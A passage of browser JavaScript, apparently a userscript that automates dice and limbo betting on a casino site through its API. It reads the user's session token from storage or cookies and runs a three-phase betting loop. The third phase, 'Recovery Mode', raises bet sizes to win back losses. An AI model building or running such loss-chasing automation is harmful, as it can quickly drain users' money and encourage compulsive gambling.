        if(currSel && currSel.value) bot.selectedCurrency = currSel.value;
        logConsole("Config loaded: minbet=" + bot.minbet + " wgrDiv=" + bot.wgrDiv);
    }
    
    function resetToPhase1(){
        bot.phase = 1;
        bot.chance = 99.98;
        bot.playgame = "dice";
        var newBet = bot.balance / bot.wgrDiv;
        bot.nextbet = Math.max(bot.minbet, newBet);
        bot.phase3Loss = 0;
        logConsole("Reset to Phase 1 - Chance 99.98% | nextbet=" + bot.nextbet.toFixed(8));
    }
    
    function goToPhase2(){
        bot.phase = 2;
        logConsole("Entering Phase 2 - Limbo mode");
    }
    
    function goToPhase3(){
        bot.phase = 3;
        bot.phase3Loss = 0;
        bot.chance = bot.phase3MinChance;
        bot.playgame = "dice";
        var newBet = bot.balance * bot.phase3BaseMult;
        bot.nextbet = Math.max(bot.minbet, newBet);
        logConsole("Entering Phase 3 - Recovery Mode | chance=" + bot.chance + "% | bet=" + bot.nextbet.toFixed(8));
    }
    
    function stopBot(){
        if(bot.isRunning){
            bot.isRunning = false;
            if(reportInterval) clearInterval(reportInterval);
            reportInterval = null;
            loopActive = false;
            logConsole("STOPPED");
            updateHUD();
        }
    }
    
    async function syncData(){
        try{
            var tk = localStorage.getItem('apitoken') || sessionStorage.getItem('apitoken') || (document.cookie.match(/session=([^;]+)/) ? document.cookie.match(/session=([^;]+)/)[1] : null);
            bot.token = tk;
            var resp = await fetch(CONFIG_API.apiUrl + "/graphql", {
                method: "POST",
                headers: { "Content-Type": "application/json", "x-access-token": bot.token },
                body: JSON.stringify({ query: "query{user{name balances{available{amount currency}}}}" })
            });
            var json = await resp.json();
            if(json && json.data && json.data.user){
                bot.stakeUser = json.data.user.name;
                var bals = json.data.user.balances || [];
                var select = document.getElementById('cfg_currency_select');
                if(select && select.options.length === 0){
                    for(var i=0; i<bals.length; i++){
                        var opt = document.createElement('option');
                        opt.value = bals[i].available.currency;
                        opt.textContent = bals[i].available.currency.toUpperCase();
                        if(bals[i].available.currency === 'doge') opt.selected = true;
                        select.appendChild(opt);
                    }
                }
                if(select && select.value) bot.selectedCurrency = select.value;
                var active = null;
                for(var i=0; i<bals.length; i++){
                    if(bals[i].available.currency === bot.selectedCurrency){
                        active = bals[i];
                        break;
                    }
                }
                var balNum = active ? parseFloat(active.available.amount) : 0;
                bot.startBalance = balNum;
                bot.balance = balNum;
                bot.balhigh = balNum;
                bot.wager = 0;
                bot.statsBets = 0;
                bot.statsWins = 0;
                bot.statsLoss = 0;
                bot.highestBet = 0;
                updateHUD();
                logConsole("Sync OK | " + bot.stakeUser + " | Balance: " + balNum.toFixed(6));
            }
        } catch(e){
            logConsole("Sync error: " + e.message);
        }
    }
    
    async function placeBet(amount, payout, game){
        var endpoint = game === "dice" ? CONFIG_API.apiUrl + "/casino/dice/roll" : CONFIG_API.apiUrl + "/casino/limbo/bet";
        var body = { amount: parseFloat(amount), currency: bot.selectedCurrency, identifier: Math.random().toString(36).slice(2) };
        if(game === "dice"){
            body.target = 100 - (100 / payout);
            body.condition = "above";
        } else {
            body.multiplierTarget = parseFloat(payout);
        }
        var res = await fetch(endpoint, {
            method: "POST",
            headers: { "Content-Type": "application/json", "x-access-token": bot.token },
            body: JSON.stringify(body)
        });
        return await res.json();
    }
    
    async function handleBet(res, amount, phaseName){
        if(res.errors){
            logConsole("Bet error: " + res.errors[0].message);
            bot.lastWin = false;
            return;
        }
        var data = res.data || res;
        var bet = data.diceRoll || data.diceBet || data.limboBet;
        if(bet){
            var pft = bet.payout - bet.amount;
            bot.balance += pft;
            bot.wager += bet.amount;
            bot.statsBets++;
            if(pft > 0) bot.statsWins++;
            else bot.statsLoss++;
            bot.lastWin = (pft > 0);
            bot.previousbet = amount;
            if(amount > bot.highestBet) bot.highestBet = amount;
            logConsole((bot.lastWin ? "WIN" : "LOSS") + " | " + phaseName + " | Bet:" + amount.toFixed(8) + " | Bal:" + bot.balance.toFixed(4) + " | Profit:" + (bot.balance - bot.startBalance).toFixed(6));
            if(!bot.lastWin && bot.phase === 3) bot.phase3Loss++;
            else if(bot.lastWin && bot.phase === 3) bot.phase3Loss = 0;
        } else {
            bot.lastWin = false;
            logConsole(phaseName + " invalid response");
        }
    }
    
    async function runLoop(){
        if(!bot.isRunning) { loopActive = false; return; }
        if(loopActive) return;
        loopActive = true;
        try{
            if(bot.balance <= bot.stoplossVal){
                logConsole("Stop loss triggered");
                stopBot();
                loopActive = false;
                return;
            }
            if(bot.wager >= bot.wagtarget){
                logConsole("Wager target reached");
                stopBot();
                loopActive = false;
                return;
            }
            var elapsed = (Date.now()/1000) - bot.stime;
            if(elapsed >= bot.HRstop * 3600 && bot.lastWin){
                logConsole("Time limit reached");
                stopBot();
                loopActive = false;
                return;
            }
            var curBal = bot.balance;
            if(curBal > bot.balhigh) bot.balhigh = curBal;
            var drawdown = ((bot.balhigh - curBal) / bot.balhigh) * 100;
            
            if(bot.phase === 1){
                bot.playgame = "dice";
                bot.chance = 99.98;
                bot.nextbet = Math.max(bot.minbet, curBal / bot.wgrDiv);
                if(drawdown >= 0.5){
                    goToPhase2();
                    loopActive = false;
                    setTimeout(function(){ runLoop(); }, 50);
                    return;
                }
                var payout = 99 / bot.chance;
                var resp = await placeBet(bot.nextbet, payout, "dice");
                await handleBet(resp, bot.nextbet, "P1");
            }
            else if(bot.phase === 2){
                var rPayout = Math.random() * (bot.phase2MaxPayout - bot.phase2MinPayout) + bot.phase2MinPayout;
                var payoutTar = parseFloat(rPayout.toFixed(2));
                bot.chance = 99 / payoutTar;
                bot.nextbet = Math.max(bot.minbet, curBal * bot.phase2BetMult);
                var lossPct = ((bot.startBalance - curBal) / bot.startBalance) * 100;
                if(lossPct >= bot.phase2LossThr){
                    goToPhase3();
                    loopActive = false;
                    setTimeout(function(){ runLoop(); }, 50);
                    return;
                }
                if(curBal >= bot.startBalance){
                    resetToPhase1();
                    loopActive = false;
                    setTimeout(function(){ runLoop(); }, 50);
                    return;
                }
                var resp2 = await placeBet(bot.nextbet, payoutTar, "limbo");
                await handleBet(resp2, bot.nextbet, "P2");
            }
            else if(bot.phase === 3){
                var lossAmount = Math.abs(bot.startBalance - curBal);
                if(lossAmount >= bot.phase3LossCap){
                    logConsole("Loss cap reset to Phase1");
                    resetToPhase1();
                    loopActive = false;
                    setTimeout(function(){ runLoop(); }, 50);
                    return;
                }
                if(!bot.lastWin){
                    if(bot.chance < 77) bot.chance = Math.min(77, bot.chance + 0.1);
                    var profitPerBet = (99 / bot.chance) - 1;
                    if(profitPerBet > 0){
                        bot.nextbet = (lossAmount / profitPerBet) * 0.65;
                    } else {
                        bot.nextbet = (bot.previousbet || bot.minbet) * 1.2;
                    }
                } else {
                    if(bot.chance > bot.phase3MinChance) bot.chance = Math.max(bot.phase3MinChance, bot.chance - bot.phase3ChanceStep);
                    bot.nextbet = curBal * bot.phase3BaseMult;
                }
                bot.nextbet = Math.max(bot.minbet, bot.nextbet);
                if(curBal >= bot.startBalance){
                    resetToPhase1();
                    loopActive = false;
                    setTimeout(function(){ runLoop(); }, 50);
                    return;
                }
                var payout3 = 99 / bot.chance;
                var resp3 = await placeBet(bot.nextbet, payout3, "dice");
                await handleBet(resp3, bot.nextbet, "P3");
            }
            updateHUD();
            loopActive = false;
            if(bot.isRunning) setTimeout(function(){ runLoop(); }, 700);
        } catch(e){
            logConsole("Loop error: " + e.message);
            loopActive = false;
            if(bot.isRunning) setTimeout(function(){ runLoop(); }, 1500);
        }
    }
    
